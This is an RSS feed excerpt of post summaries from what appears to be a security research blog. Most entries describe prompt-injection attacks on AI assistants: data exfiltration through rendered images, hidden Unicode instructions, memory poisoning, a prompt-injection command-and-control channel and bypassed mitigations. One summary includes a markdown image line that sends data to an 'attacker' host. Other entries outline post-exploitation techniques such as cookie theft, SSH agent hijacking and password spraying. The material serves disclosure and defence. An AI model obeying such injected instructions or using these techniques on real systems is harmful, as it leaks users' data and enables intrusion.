      <description>When the Model Context Protocol (MCP) came out it reminded me of the Common Object Model (COM) from Microsoft.&#xA;COM has been around for decades and it&amp;rsquo;s used for programming, scripting, sharing of functionality at a binary/object level across languages and hosts. Via DCOM all of this can even be done remotely, and well, it&amp;rsquo;s also useful for red teaming. A lot of software on Windows was/is implemented as COM objects, including Microsoft Office.</description>

      <description>Recently OpenAI added an additional memory feature called &amp;ldquo;chat history&amp;rdquo;, which allows ChatGPT to reference past conversations. The details of the implementation are not known. The documentation highlights that: &amp;ldquo;It uses this to learn about your interests and preferences, helping make future chats more personalized and relevant.&amp;rdquo;&#xA;I decided to spend some time to figure out how it works.&#xA;Update: Video Tutorial Added Based on the interest in this post, I&amp;rsquo;ve also created a video tutorial.</description>

      <description>The Model Context Protocol (MCP) is a protocol definition for how LLM apps/agents can leverage external tools. I have been calling it Model Control Protocol at times, because due to prompt injection, MCP tool servers control the client basically.&#xA;This post will explain in detail why that is, and I will also share a novel exploit chain.&#xA;Why MCP - How Is It Different? The main difference to other tool invocation setups, like OpenAPI is that MCP is dynamic.</description>

      <description>You are likely aware of ASCII Smuggling via Unicode Tags. It is unique and fascinating because many LLMs inherently interpret these as instructions when delivered as hidden prompt injection, and LLMs can also emit them. Then, a few weeks ago, a post on Hacker News demonstrated how Variant Selectors can be used to smuggle data.&#xA;This inspired me to take this further and build Sneaky Bits, where we can encode any Unicode character (or sequence of bytes for that matter) with the usage of only two invisible characters.</description>

      <description>Imagine your AI rewriting your personal history&amp;hellip;&#xA;A while ago Google added memories to Gemini. Memories allow Gemini to store user-related data across sessions, storing information in long-term memory. The feature is only available to users who subscribe to Gemini Advanced so far. So, in the fall of last year I chimed in and paid for the subscription for a month to check it out.&#xA;As a user you can see what Gemini stored about you at https://gemini.</description>

      <description>At Black Hat Europe I did a fun presentation titled SpAIware and More: Advanced Prompt Injection Exploits. Without diving into the details of the entire talk, the key point I was making is that prompt injection can impact all aspects of the CIA security triad.&#xA;However, there is one part that I want to highlight explicitly:&#xA;A Command and Control system (C2) that uses prompt injection to remote control ChatGPT instances.</description>

      <description>I regularly look at how the system prompts of chatbots change over time. Updates frequently highlight new features being added, design changes that occur and potential areas that might benefit from more security scrutiny.&#xA;A few months back I noticed an interesting update to the M365 Copilot (BizChat) system prompt. In particular, there used to be one enterprise_search tool in the past. You might remember that tool was used during the Copirate ASCII Smuggling exploit to search for MFA codes in the user&amp;rsquo;s inbox.</description>

      <description>A few days ago, Anthropic released Claude Computer Use, which is a model + code that allows Claude to control a computer. It takes screenshots to make decisions, can run bash commands and so forth.&#xA;It&amp;rsquo;s cool, but obviously very dangerous because of prompt injection. Claude Computer Use enables AI to run commands on machines autonomously, posing severe risks if exploited via prompt injection.&#xA;Disclaimer So, first a disclaimer: Claude Computer Use is a Beta Feature and what you are going to see is a fundamental design problem in state-of-the-art LLM-powered Applications and Agents.</description>

      <description>This post explains an attack chain for the ChatGPT macOS application. Through prompt injection from untrusted data, attackers could insert long-term persistent spyware into ChatGPT&amp;rsquo;s memory. This led to continuous data exfiltration of any information the user typed or responses received by ChatGPT, including any future chat sessions.&#xA;OpenAI released a fix for the macOS app last week. Ensure your app is updated to the latest version.&#xA;Let&amp;rsquo;s look at this spAIware in detail.</description>

      <description>This post describes vulnerability in Microsoft 365 Copilot that allowed the theft of a user&amp;rsquo;s emails and other personal information. This vulnerability warrants a deep dive, because it combines a variety of novel attack techniques that are not even two years old.&#xA;I initially disclosed parts of this exploit to Microsoft in January, and then the full exploit chain in February 2024. A few days ago I got the okay from MSRC to disclose this report.</description>

      <description>Recently, I found what appeared to be a regression or bypass that again allowed data exfiltration via image rendering during prompt injection. See the previous post here for reference.&#xA;Data Exfiltration via Rendering HTML Image Tags During re-testing, I had sporadic success with markdown rendering tricks, but eventually, I was able to drastically simplify the exploit by asking directly for an HTML image tag.&#xA;This behavior might actually have existed all along, as Google AI Studio hadn&amp;rsquo;t yet implemented any kind of Content Security Policy to prevent communication with arbitrary domains using images.</description>

      <description>In the previous post we demonstrated how instructions embedded in untrusted data can invoke ChatGPT&amp;rsquo;s memory tool. The examples we looked at included Uploaded Files, Connected Apps and also the Browsing tool.&#xA;When it came to the browsing tool we observed that mitigations were put in place and older demo exploits did not work anymore. After chatting with other security researchers, I learned that they had observed the same.&#xA;However, with some minor prompting tricks mitigations are bypassed and we, again, can demonstrate automatic tool invocation when browsing the Internet with ChatGPT!</description>

      <description>OpenAI recently introduced a memory feature in ChatGPT, enabling it to recall information across sessions, creating a more personalized user experience.&#xA;However, with this new capability comes risks. Imagine if an attacker could manipulate your AI assistant (chatbot or agent) to remember false information, bias or even instructions, or delete all your memories! This is not a futuristic scenario, the attack that makes this possible is called Indirect Prompt Injection.</description>

      <description>This post is part of a series about machine learning and artificial intelligence.&#xA;Adversaries often leverage supply chain attacks to gain footholds. In machine learning model deserialization issues are a significant threat, and detecting them is crucial, as they can lead to arbitrary code execution. We explored this attack with Python Pickle files in the past.&#xA;In this post we are covering backdooring the original Keras Husky AI model from the Machine Learning Attack Series, and afterwards we investigate tooling to detect the backdoor.</description>

      <description>Recently Google published a blog about detecting browser data theft using Windows Event Logs.&#xA;There are some good points in the post for defenders on how to detect misuse of DPAPI calls attempting to grab sensitive browser data.&#xA;But, what about the Remote Debugging feature? This made me curious to revisit the state of the remote debugging feature of browsers for grabbing sensitive information, including cookies.&#xA;We discussed cookie theft techniques in the past, even presented about it at the CCC some 5+ years ago and helped add the TTP to the MITRE ATT&amp;amp;CK matrix.</description>

      <description>Google&amp;rsquo;s NotebookLM is an experimental project that was released last year. It allows users to upload files and analyze them with a large language model (LLM).&#xA;However, it is vulnerable to Prompt Injection, meaning that uploaded files can manipulate the chat conversation and control what the user sees in responses.&#xA;There is currently no known solution to these kinds of attacks, so users can&amp;rsquo;t implicitly trust responses from large language model applications when untrusted data is involved.</description>

      <description>About a year ago we talked about how developers can&amp;rsquo;t intrinsically trust LLM responses and common threats that AI Chatbots face and how attackers can exploit them, including ways to exfiltrate data.&#xA;One of the threats is unfurling of hyperlinks, which can lead to data exfiltration and is something often seen in Chatbots. So, let&amp;rsquo;s shine more light on it, including practical guidance on how to mitigate it with the example of Slack Apps.</description>

      <description>Last November, while testing Google Bard (now called Gemini) for vulnerabilities, I had a couple of interesting observations when it comes to automatic tool invocation.&#xA;Confused Deputy - Automatic Tool Invocation First, what do I mean by this&amp;hellip; &amp;ldquo;automatic tool invocation&amp;rdquo;&amp;hellip;&#xA;Consider the following scenario: An attacker sends a malicious email to a user containing instructions to call an external tool. Google named these tools Extensions.&#xA;When the user analyzes the email with an LLM, it interprets the instructions and calls the external tool, leading to a kind of request forgery or maybe better called automatic tool invocation.</description>

      <description>Your Code Interpreter sandbox, also known as Advanced Data Analysis sessions, are shared between private and public GPTs. Yes, your actual compute container and its storage is shared. Each user gets their own isolated container, but if a user uses multiple GPTs and stores files in Code Interpreter all GPTs can access (and also overwrite) each others files.&#xA;This is true also for files uploaded/created with private GPTs and ChatGPT itself.</description>

      <description>A couple of weeks ago hidden prompt injections were discovered and we covered it at the time.&#xA;This video explains it in more detail, and also highlights implications beyond hiding instructions, including what I call ASCII Smuggling. This is the usage of Unicode Tags Block characters to both craft and deciper hidden messages in plain sight.&#xA;Using Unicode encoding to bypass security features or execute code (XSS, SSRF,..) has been in use for a while, however this new TTP enables more sophisticated attack scenarios.</description>

      <description>A few weeks ago while waiting at the airport lounge I was wondering how other Chatbots, besides ChatGPT, handle hidden Unicode Tags code points.&#xA;A quick reminder: Unicode Tags code points are invisible in UI elements, but ChatGPT was able to interpret them and follow hidden instructions. Riley Goodside discovered it.&#xA;What about Anthropic Claude? While waiting for a flight I figured to look at Anthropic Claude. Turns out it has the same issue as ChatGPT had.</description>

      <description>A few days ago Riley Goodside posted about an interesting discovery on how an LLM prompt injection can happen via invisible instructions in pasted text. This works by using a special set of Unicode code points from the Tags Unicode Block.&#xA;The proof-of-concept showed how a simple text contained invisible instructions that caused ChatGPT to invoke DALL-E to create an image.&#xA;Hidden Instructions for LLMs The meaning of these &amp;ldquo;Tags&amp;rdquo; seems to have gone through quite some churn, from language tags to eventually being repurposed for some emojis.</description>

      <description>When OpenAI released GPTs last month I had plans for an interesting GPT.&#xA;Malicious ChatGPT Agents The idea was to create a kind of malware GPT that forwards users&amp;rsquo; chat messages to a third party server. It also asks users for personal information like emails and passwords.&#xA;Why would this be possible end to end? ChatGPT cannot guarantee to keep your conversation private or confidential, because it loads images from any website.</description>

      <description>What happens if an attacker calls an LLM tool or plugin recursively during an Indirect Prompt Injection? Could this be an issue and drive up costs, or DoS a system?&#xA;I tried it with ChatGPT, and it indeed works and the Chatbot enters a loop! 😊&#xA;However, for ChatGPT users this isn&amp;rsquo;t really a threat, because:&#xA;It&amp;rsquo;s subscription based, so OpenAI would pay the bill. There seems to be a call limit of 10 times in a single conversation turn (I tried a few times).</description>

      <description>ChatGPT is vulnerable to data exfiltration via image markdown injections. This. is. pretty well known.&#xA;As more features are added to ChatGPT the exfiltration angle becomes more likely to be abused.&#xA;Recently OpenAI added Custom Instructions, which allow to have ChatGPT always automatically append instructions to every message exchange.&#xA;An adversary can abuse this feature to install a data exfiltration backdoor that depends on, and only works because of the image markdown injection vulnerability.</description>

      <description>A prompt injection scenario that I, and others, have been wondering about in the past, is the potential risk associated with chatbots being able to analyze images.&#xA;Could this ability open up the way for Indirect Prompt Injection attacks?&#xA;Recently, Google added the ability to uploading and analyze images with Bard. And it turns out that it is indeed possible to add instructions to an image, and have the Bard follow those instructions.</description>

      <description>In the previous post we discussed the risks of OAuth enabled plugins being commonly vulnerable to Cross Plugin Request Forgery and how OpenAI is seemingly not enforcing new plugin store policies. As an example we explored how the &amp;ldquo;Chat with Code&amp;rdquo; plugin is vulnerable. Recently, a post on Reddit titled &amp;ldquo;This is scary! Posting stuff by itself&amp;rdquo; shows how a conversation with ChatGPT, out of the blue (and what appears to be by accident) created a Github Issue!</description>

      <description>OpenAI continues to add plugins with security vulnerabilities to their store.&#xA;In particular powerful plugins that can impersonate a user are not getting the required security scrutiny, or a general mitigation at the platform level.&#xA;As a brief reminder, one of the challenges Large Language Model (LLM) User-Agents, like ChatGPT, and plugins face is the Confused Deputy Problem / Plugin Request Forgery Attacks, which means that during a Prompt Injection attack an adversary can issue commands to plugins to cause harm.</description>

      <description>This post describes how I found a Prompt Injection attack angle in Bing Chat that allowed malicious text on a webpage (like a user comment or an advertisement) to exfiltrate data.&#xA;The Vulnerability - Image Markdown Injection When Bing Chat returns text it can return markdown elements, which the client will render as HTML. This includes the feature to include images.&#xA;Imagine the LLM returns the following text:&#xA;![data exfiltration in progress](https://attacker/logo.</description>

      <description>This post shows how a malicious website can take control of a ChatGPT chat session and exfiltrate the history of the conversation.&#xA;Plugins, Tools and Integrations With plugins, data exfiltration can happen by sending too much data into the plugin in the first place. More security controls and insights on what is being sent to the plugin are required to empower users.&#xA;However, this post is not about sending too much data to a plugin, but about a malicious actor who controls the data a plugin retrieves.</description>

      <description>As discussed previously the problem of Indirect Prompt Injections is increasing.&#xA;They start showing up in many places.&#xA;A new unique one that I ran across is YouTube transcripts. ChatGPT (via Plugins) can access YouTube transcripts. Which is pretty neat. However, as expected (and predicted by many researches) all these quickly built tools and integrations introduce Indirect Prompt Injection vulnerabilities.&#xA;Proof of Concept Here is how it looks with ChatGPT end to end with a demo example.</description>

      <description>There are many prompt engineering classes and currently pretty much all examples are vulnerable to Prompt Injections. Especially Indirect Prompt Injections are dangerous as we discussed before.&#xA;Indirect Prompt Injections allow untrusted data to take control of the LLM (large language model) and give an AI a new instructions, mission and objective.&#xA;Bypassing Input Validation Attack payloads are natural language. This means there are lots of creative ways an adversary can inject malicious data that bypass input filters and web application firewalls.</description>

      <description>Playing around with Bing Chat is quite fun. Until today I mostly used ChatGPT and GPT-4 directly, but I was curious of the capabilites and restrictions of Bing Chat.&#xA;I noticed that as soon as I mentioned the word &amp;ldquo;hacker&amp;rdquo;, Bing Chat became quite &amp;ldquo;uncomfortable&amp;rdquo;. For instance, when I asked it to imagine being a hacker and list some security vulnerabilities, it replied:&#xA;I’m sorry but I cannot help you with that.</description>

So, I figured to write some of them down, starting with SSH Agent Hijacking.&#xA;What is SSH Agent Hijacking? Short story, if you have keys added to an SSH Agent an adversary with root permissions can use them. If you forward the SSH Agent to another host, an adversary with root permission on that other host can exploit and leverage your keys as well.</description>

Click the &amp;ldquo;ebpf&amp;rdquo; tag to see all related posts.&#xA;It has been a while that we posted something in the &amp;ldquo;Offensive BPF&amp;rdquo; series. But recently there have been a couple of new cool ebpf based tools, such as TripleCross, boopkit and pamspy.&#xA;So, I thought it be quite fitting to do another post in the Offensive BPF series to keep raising awareness.</description>

      <description>Pluggable Authentication Modules (PAM) on Unix based systems are useful to change logon behavior and enforce authentication via various means.&#xA;In &amp;ldquo;Red Team Strategies&amp;rdquo; the chapter &amp;ldquo;Protecting the Pentester&amp;rdquo; walks the reader through the configuration of a PAM module to get notified in real-time via a pop-up when someone logs on to the machine (e.g. system compromise).&#xA;But there are also bad things that can be done with PAM (especially post-exploitation) and this is what this post is about.</description>

      <description>As the saying goes, a picture is worth a thousand words.&#xA;In order to improve your documentation and uplevel red team and pentest reporting, it&amp;rsquo;s useful to add date and time information to screenshots and script logs.&#xA;This helps the Blue Team (and yourself) reviewing past activity, reports and when deconflicting activity is required. Depending on the shell that is used there are different ways to go about it. Let&amp;rsquo;s cover three common ones.</description>

      <description>In this post, we&amp;rsquo;ll examine how GPT-3 could be used by red teams or adversaries to perform successful phishing attacks. We&amp;rsquo;ll also discuss some potential countermeasures that organizations can take to protect themselves against this type of threat.&#xA;What is GPT-3? GPT-3 is a neural network-based machine learning system that was developed by OpenAI, a research lab focused on artificial intelligence. It is designed to generate text that sounds realistic and human-like, and it has been trained on a large corpus of text, including billions of words from the internet.</description>

      <description>Information for red teaming macOS and info on real world TTPs are still a bit sparse. That makes it difficult for defenders to know what attackers do on macOS compared to Windows. Some organizations might have a bigger blind spot when it comes to macOS.&#xA;This post describes how an adversary can grab hashes from a macOS machine, how to convert it to a hashcat friendly format and use hashcat to crack it.</description>

      <description>One area that I have encountered quite often over the years is that during recon phase of a bug bounty hunt or pentest a set of AWS access keys are being discovered.&#xA;Let&amp;rsquo;s say you found 50 AWS access keys by drooling and hunting through public Github repos and using other nifty tricks and means.&#xA;How do you go about checking their validity? And what do they have access to and provide the Bug Bounty Program or Blue Team the dates, times, and IP address when those keys were used?</description>

      <description>Although Gitlab is not as popular as Github, it’s common to run across it these days. Especially after Microsoft acquired Github it seemed more individuals and organizations flocked over to Gitlab.&#xA;In this post I want to document a couple of recon commands that are useful post-exploitation, and for blue teamers to watch out for.&#xA;Let&amp;rsquo;s assume one has access to a Gitlab Token as a precursor. Let&amp;rsquo;s walk through some interesting commands and script snippets to leverage to find out more.</description>

      <description>A nifty way for adversaries to acquire passwords during post-exploitation is to spoof credential dialogs and perform a local phishing attack. This means tricking a user on a compromised computer to enter their password.&#xA;Unfortunately, users are conditioned to enter their credentials frequently and therefore don&amp;rsquo;t question random passwords prompts too much.&#xA;Long, long time ago&amp;hellip; but nothing has changed The idea to spoof a credential dialog is one of the most simple ideas one might come up with.</description>

      <description>You probably heard of NFTs (non-fungible tokens). They are receiving a lot of interest over the last several months. I did some digging and realized that there are some bigger issues with the standards and various interpretations and implementations of it, and how centralized many offerings are.&#xA;What is an NFT The idea behind it is simple, use a blockchain (and cryptography) to assign and be able to proof ownership over a specific piece of digital content.</description>

      <description>Next week (on March, 9th 2021) I will be speaking at the Hong Kong Information Security Summit 2021.&#xA;歡迎, 你好!&#xA;I was invited to share my thoughts around protecting the modern (and remote) workplace. Of course, my talk is addressing this topic from a red teaming point of view. Conference details are here.&#xA;The adversary will come to your house The name of the talk is &amp;ldquo;Red Team Strategies for Helping Protect the Modern Workplace&amp;rdquo; which might seem less creative, but there is some (hopefullly) good and interesting information in my talk.</description>

      <description>The other day I read this blog post about &amp;ldquo;The Death of Manual Red Teams&amp;rdquo; and I thought I&amp;rsquo;d take a moment to comment on it to provide an alternative perspective.&#xA;In my opinion the premise of the blog post is backwards, highlighting a lack of understanding of what red teaming is about.&#xA;For instance the following sentence in the post seems quite incorrect: &amp;ldquo;Red teaming is the process of using existing, already known security bugs and vulnerabilities to hack a system.</description>

      <description>Survivorship bias is an interesting thing that we can observe nearly daily. It is the success stories of exponentially growing startups, the motivational speaker who shares their insights on how to be successful and so forth.&#xA;What is it exactly?&#xA;What is survivorship bias? Wikipedia defines it as &amp;ldquo;&amp;hellip;the logical error of concentrating on the people or things that made it past some selection process and overlooking those that did not, typically because of their lack of visibility.</description>

      <description>Security metrics are an interesting topic.&#xA;Over the years I used &amp;ldquo;scores&amp;rdquo; as a tool to identify and shine light on problematic areas or highlight lack of engineering and security quality of certain teams.&#xA;A security score should not seen as an objective or absoulte measure, but it allows to compare systems with each other at a relative scale, and by sharing the score it makes people ask questions.&#xA;I have seen showing management ask vivid questions when they see a chart with their service and a score next to it:</description>

      <description>Today FireEye shared that they were victim of a cyberattack and internal red teaming tooling was accessed by adversaries. More details in this NYT article.&#xA;This reminded me that I wanted to do a post on actively protecting pen testers and pen testing assets for a while.&#xA;Against persistent adversaries it is only a matter of time when they succeed, not if they will succeed. The big question is do you know when an adversary starts poking around, and when they succeed?</description>

      <description>What a journey it has been. I wrote quite a bit about machine learning from a red teaming/security testing perspective this year. It was brought to my attention to provide a conveninent &amp;ldquo;index page&amp;rdquo; with all Husky AI and related blog posts. Here it is.&#xA;Machine Learning Basics and Building Husky AI Getting the hang of machine learning The machine learning pipeline and attacks Husky AI: Building a machine learning system MLOps - Operationalizing the machine learning model Threat Modeling and Strategies Threat modeling a machine learning system Grayhat Red Team Village Video: Building and breaking a machine learning system Assume Bias and Responsible AI Practical Attacks and Defenses Brute forcing images to find incorrect predictions Smart brute forcing Perturbations to misclassify existing images Adversarial Robustness Toolbox Basics Image Scaling Attacks Stealing a model file: Attacker gains read access to the model Backdooring models: Attacker modifies persisted model file Repudiation Threat and Auditing: Catching modifications and unauthorized access Attacker modifies Jupyter Notebook file to insert a backdoor CVE 2020-16977: VS Code Python Extension Remote Code Execution Using Generative Adversarial Networks (GANs) to create fake husky images Using Microsoft Counterfit to create adversarial examples Backdooring Pickle Files Backdooring Keras Model Files and How to Detect It Miscellaneous Participating in the Microsoft Machine Learning Security Evasion Competition - Bypassing malware models by signing binaries Husky AI Github Repo Conclusion As you can see there are many machine learning specific attacks, but also a lot of &amp;ldquo;typical&amp;rdquo; red teaming techniques that put AI/ML systems at risk.</description>

      <description>You might have heard about &amp;ldquo;NAT Slipstreaming&amp;rdquo; by Samy Kamkar. It&amp;rsquo;s an amazing technique that allows punching a hole in your routers firewall by just visiting a website.&#xA;The attack depends on the router having the Application Layer Gateway enabled. This gateway can be used by anyone inside your network to open a firewall port (totally by design). Protocols such as SIP (Session Initiation Protocol) use it.&#xA;What I will focus on in this post is the Application Layer Gateway (ALG) and SIP.</description>

      <description>A few years back the Blue Team of a company asked to be targeted in a Red Team Operation.&#xA;That was a really fun, because Rules of Engagement commonly prevent targeting Blue Teams. Blue&amp;rsquo;s infrastructure, systems and team members are often out of scope, unfortunately.&#xA;Blue team infrastructure is a gold mine for credentials, recon but also for remote code execution!&#xA;Often companies do not have adequate protection, procedures (MFA, multi-person attestation), monitoring and auditing in place when it comes to accessing data from endpoint agents.</description>

      <description>There is a lot of discussion around terms such as red team, attack team, pentest, adversarial engineering or offensive security team and similar ones.&#xA;I typically stay away from the (sometimes passionate) discussions that ensue whenever this topic comes up.&#xA;Personally, I think a good strategy is to define programs and teams who operate in this space by what services the team (or teams) provide(s) to the organization.&#xA;The business groups, blue team, developers, engineers, employees and clients are the customers.</description>

      <description>While building &amp;ldquo;Husky AI&amp;rdquo; I started working a lot with Microsoft&amp;rsquo;s VS Code Python extension. It is a super convinient way to edit Jupyter Notebooks. I just use VS Code&amp;rsquo;s Remote SSH feature to get to my Linux host and work on modeling and testing there.&#xA;When threat modeling &amp;ldquo;Husky AI&amp;rdquo; I identified backdooring of third party libraries and development tools as a potential issue to be aware of.&#xA;So finding security issues in the tools is naturally something I am keeping an eye on.</description>

      <description>Today I&amp;rsquo;m gonna talk about a class of application security issues I ran across a few times over the years. In particular, let&amp;rsquo;s discuss race conditions when it comes to files with sensitive content and permissions.&#xA;Race conditions can allow an adversary to gain access to sensitive information on machines. Assume a system creates a file that contains sensitive information and afterwards applies permissions to lockdown that file.&#xA;Understanding the race condition Let&amp;rsquo;s look at a practical example seen in the wild a few times.</description>

      <description>These days business decisions and feature development often is influenced heavily by telemetry information. Telemetry is baked into the programs, services and applications we use.&#xA;Companies are hungry for telemetry because with machine learning and Deep Neural Networks &amp;ldquo;data is the new oil&amp;rdquo;.&#xA;Telemetry provides insights into how users use a particular system, what features they exercise, how they configure the system, what errors they trigger and what buttons they like clicking on.</description>

      <description>Throughout my career I have been fascinated with quality assurance and testing, especially security testing and red teaming. One discussion that comes up frequently is how to measure the maturity of such programs and processes.&#xA;My answer is straight forward as there are already existing frameworks that can be leveraged, adjusted and borrowed from to fit the needs of offensive security programs.&#xA;You are likely familiar or have at least heard of the Capability Maturity Model Integration from Carnegie Mellon University.</description>

      <description>In this post I will discuss some testing techniques for internal red teams to identify privacy issues in services and infrastructure, most importantly a simple three step approach that might uncover interesting results.&#xA;Background story First, let me share a story from the past. When I did my master&amp;rsquo;s I built an app that performs end to end encryption of Facebook posts. This means that only the intended audience for which your posts were encrypted for can decipher the posts.</description>

      <title>Firefox - Debugger Client for Cookie Access</title>

      <guid>https://embracethered.com/blog/posts/2020/firefox-cookie-debug-client/</guid>
      <description>Finally I got to writing some basic tooling for invoking the Firefox debugging API to send commands to the browser and read the responses. This can be useful for grabbing cookies in the post-exploitation phase.&#xA;It works for Windows and macOS, should also work on Linux.&#xA;This technique is probably most useful when we don&amp;rsquo;t have root or the user&amp;rsquo;s credentials to decrypt cookies or can&amp;rsquo;t attach a regular debugger to the browser process.</description>

      <description>Previously I talked about remotely debugging Chrome, and we also covered the latest Microsoft Edge browser along the way.&#xA;These features allow an adversary to gain access to authentication tokens and cookies. See MITRE ATT&amp;amp;CK Technique T1539: Steal Web Session Cookie as well for this.&#xA;What about Firefox? For a while I was wondering if (my favorite) browser Firefox has such debugging features as well, and how one could detect malware trying to exploit it.</description>

      <guid>https://embracethered.com/blog/posts/2020/windows-port-forward/</guid>
      <description>A technique on Windows that is less known is how to do basic port-proxying.&#xA;Proxying ports is useful when a process binds on one (maybe only the local) interface and you want to expose that endpoint on another network interface.&#xA;Let&amp;rsquo;s say you have an existing process that listens only on the loopback interface, and you want to expose it remotely. Or there are two network interfaces and you want expose traffic from one to the other (maybe some evil persistence for port 3389) - or think of basic pivoting.</description>

      <description>Some organization have this interesting concept of a bug jail to prevent new feature development when there are too many existing flaws in the system.&#xA;For instance, if an engineer has 5 or more bugs assigned they aren&amp;rsquo;t allowed to work on anything else but fixing their bugs.&#xA;What is the Security Bug Jail? A security bug jail goes along the same lines. The owner of a system can never have more than a certain upper limit of active security bugs.</description>

      <description>Monte Carlo simulations can be a useful tool to uplevel your red teaming skills and provide a different and fresh perspective for highlighting, discussing and presenting findings.&#xA;Red teaming is about challenging an organization. This includes analyzing business processes and methodologies, including our own.&#xA;Obviously, using Monte Carlo simulations in the security realm is not my idea. I first ran across the idea in Hubbard&amp;rsquo;s book about measuring cybersecurity risk. Since then I have been thinking and playing around with applying these methods to security program&amp;rsquo;s, especially red teaming and threat modeling.</description>

      <description>The results of phishing campaigns are often not comparable with each other over time. Various security vendors and red teams use different tooling and techniques - which is totally fine.&#xA;However, I recommend requiring tracking a minimum set of metrics to be able to compare results over time.&#xA;Funny side facts: At times employees are messing with the red team, entering invalid creds for CISO or CEO and things along those lines.</description>

      <description>Chrome&amp;rsquo;s remote debugging feature enables malware post-exploitation to gain access to cookies. Root privileges are not required. This is a pretty well-known and commonly used adversarial technique - at least since 2018 when Cookie Crimes was released.&#xA;However, remote debugging also allows observing user activities and sensitive personal information (aka spying on users) and controlling the browser from a remote computer.&#xA;Below screenshot shows a simulated attacker controlling the victim&amp;rsquo;s browser and navigating to chrome://settings to inspect information:</description>

      <description>Adversaries are leveraging widely exposed clear text credentials to gain access to sensitive information.&#xA;At times the term &amp;ldquo;harvesting credentials&amp;rdquo; is used when red teamers emulate these attacks - which is something that appears to be more opportunistic and I would propose that security teams start to actively hunt for credential exposure that can put their organization at risk &amp;ndash; in case you are not yet doing that.&#xA;Actively hunting for credential exposure The idea of credential hunting is targeted and focused, leveraging intelligence about systems and combing it with powerful search techniques to identify exposure.</description>

The idea is to, by practical means, limit attack surface and prevent spreading of automated malware, as well as limiting lateral movement by adversaries.&#xA;Network security over the last 15 years Malware can spread fast and damage businesses at scale.&#xA;SQL Slammer [1] and WannaCry [2] are two well-known cases that showed how quickly and damaging this can be.</description>

      <description>MITRE just updated the ATT&amp;amp;CK Framework to include Cloud TTPs.&#xA;The update includes techniques for stealing cookies from machines and using them for lateral movement. These are the two techniques I helped contribute to the matrix:&#xA;Credential Access - Steal Web Session Cookie Lateral Movement - Web Session Cookie It was exciting experience to collaborate with MITRE and contribute on this. And kinda cool to see the Pass the Cookie work referenced.</description>

      <title>Coinbase under attack and cookie theft</title>

      <description>Recently Coinbase published a well written blog post on how they were under attack. The adversaries exploite Firefox 0-days. Details can be found here. One intersting aspect is the following:&#xA;&amp;ldquo;We have also observed the attackers specifically target cloud services, e.g. gmail and others, via browser session token theft via direct access to browser datastores. This activity also offers the opportunity for behavior-based detection, as relatively few processes should be directly accessing those files.</description>

      <title>Cybersecurity - Homefield Advantage</title>

      <description>No one should beat your security team on the homefield! For several years I have been using the term Homefield Advantage in the context of running a security program, especially in regards to certain aspects of red teaming. Homefield Advantage describes well what a mature security program has to realize and leverage.&#xA;Wikipedia describes &amp;ldquo;home advantage&amp;rdquo; in team sports and highlights some of the benefits:&#xA;&amp;ldquo;This benefit has been attributed to psychological effects supporting fans have on the competitors or referees; to psychological or physiological advantages of playing near home in familiar situations; to the disadvantages away teams suffer from changing time zones or climates, or from the rigors of travel; and, in some sports, to specific rules that favor the home team directly or indirectly.</description>

      <title>BashSpray - Simple Password Spray Bash Script</title>
      <link>https://embracethered.com/blog/posts/bash-spray-password/</link>

      <description>One thing every red team should attempt early on and regularly is to perform some password spray testing across their organization to identify and help remediate usage of weak passwords.&#xA;In the past I have done this on Windows a lot, but now I built a simple version for it for Bash to run it also from a Mac.&#xA;Check it out: Bash Spray&#xA;Ideally, a script like bashspray.sh is integrated into your response pipelines, and SOC, Blue Team as well as account owner get notified - so they change their password right away, and any SOC investigation can be performed if necessary.</description>

      <description>Interacting with Active Directory on the Mac Did you ever have to interact with Active Directory on a MAC?&#xA;If yes, this post might be interesting for you. I am pretty new to the Mac and basic things I know how to do on Windows need some research to figure out. This time around I explore Active Directory/LDAP Server interactions.&#xA;First, there is the Directory Utility on MacOS which can be quite useful.</description>

      <title>Google Leaks Your Alternate Email Addresses to Unauthenticated Users</title>

      <description>The Google Login Flow leaks additional email account information to unauthenticated users. I discovered this in the Google Account Login flow while building KoiPhish.&#xA;Responsible Disclosure I reported this issue to Google and they looked into it and after a about 5 weeks of back and forth they decided that this is not an issue worth fixing. After asking if I can post about it publicly I got Google&amp;rsquo;s okay.</description>

      <title>Lyrebird - Hack the hacker (and take a picture)</title>
      <link>https://embracethered.com/blog/posts/lyrebird/</link>

      <description>The idea for Lyrebird came from observing that sometimes when someone forgets lock their workstation, someone else might mess with their computer. Since I wanted to learn more on how to program a webcam and take pictures - I figured why not create a little tool that takes a screenshot and uses the webcam to take pictures of anyone that interacts with the computer while I&amp;rsquo;m gone.&#xA;The way this work is simple, start Lyrebird.</description>

      <description>KoiPhish is a simple yet beautiful relay proxy idea.&#xA;The idea for this little project goes back many years. Since I started learning Golang I figured it would be good exercise to finally go ahead an implement it. So, last December during the 35C3 (which is always inspiring congress) I wrote it up.&#xA;It relays requests a client makes to the KoiPish to the actual target and responses are sent back to the client.</description>

      <description>Just a list of useful notes when dealing with Macs. I&amp;rsquo;m pretty new to Macs and there might be other, better solutions to the challenges I had to sovle but these worked for me and I&amp;rsquo;m learning. :)&#xA;Pivoting between accounts and keychain issues After pivoting on a target host and elevating to root it seems not possible to gain access to other keychains easily. It requires to know the password of the other account still.</description>

      <title>Pass the Cookie and Pivot to the Clouds</title>

      <description>Web Applications and Services use cookies to authenticate sessions and users. An adversary can pivot from a compromised host to Web Applications and Internet Services by stealing authentication cookies from browsers and related processes. At the same time this technique bypasses most multi-factor authentication protocols.&#xA;The reason for this is that the final authentication token that the attacker steals is issued after all factors have been validated. Many users persist cookies that are valid for an extended period of time, even if the web application is not actively used.</description>
